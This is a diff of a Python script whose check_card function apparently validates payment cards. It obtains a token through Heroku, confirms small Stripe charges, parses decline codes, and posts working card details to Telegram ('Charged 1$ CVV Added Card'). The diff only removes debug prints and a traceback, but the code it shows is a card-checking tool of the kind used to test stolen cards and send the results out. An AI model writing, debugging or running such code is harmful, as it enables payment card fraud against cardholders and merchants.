@@ -166,16 +166,10 @@ def check_card(card_details, heroku_auth_key):
 
         heroku_token_response = requests.post(heroku_token_url, headers=heroku_headers)
         
-        # Debug: Print Heroku response
-        print(f"Heroku Status: {heroku_token_response.status_code}")
-        
         # Check if response is valid JSON
         try:
             heroku_token_data = heroku_token_response.json()
-            print(f"Heroku Response: {heroku_token_data}")
         except Exception as json_err:
-            print(f"JSON parse error: {json_err}")
-            print(f"Raw response: {heroku_token_response.text[:500]}")
             return f"{RED}Invalid Heroku response (Status: {heroku_token_response.status_code}){RESET}"
         
         if heroku_token_data is None:
@@ -278,10 +272,6 @@ def check_card(card_details, heroku_auth_key):
             if response_body is None:
                 return f"{RED}Empty response from Stripe confirm{RESET}"
 
-            # Debug: Print response code and full body
-            print(f"Stripe confirm status: {response_code}", flush=True)
-            print(f"Stripe confirm body: {response_body}", flush=True)
-
             if response_code == 402:
                 error_obj = response_body.get('error') or {}
                 decline_code = error_obj.get('decline_code')
@@ -319,9 +309,6 @@ def check_card(card_details, heroku_auth_key):
                     send_to_telegram(f"{card_details} - Charged 1$ CVV Added Card !!")
                     return result
                 elif status == 'requires_action':
-                    # Debug: Print full response to see where decline info is
-                    print(f"Full response: {response_body}", flush=True)
-                    
                     # Check for decline reason in last_payment_error
                     last_error = response_body.get('last_payment_error') or {}
                     decline_code = last_error.get('decline_code')
@@ -359,8 +346,6 @@ def check_card(card_details, heroku_auth_key):
     except requests.exceptions.RequestException as e:
         return f"{RED}Request failed: {str(e)}{RESET}"
     except Exception as e:
-        import traceback
-        traceback.print_exc()
         return f"{RED}Card check failed: {str(e)}{RESET}"
 
 def start_card_check():
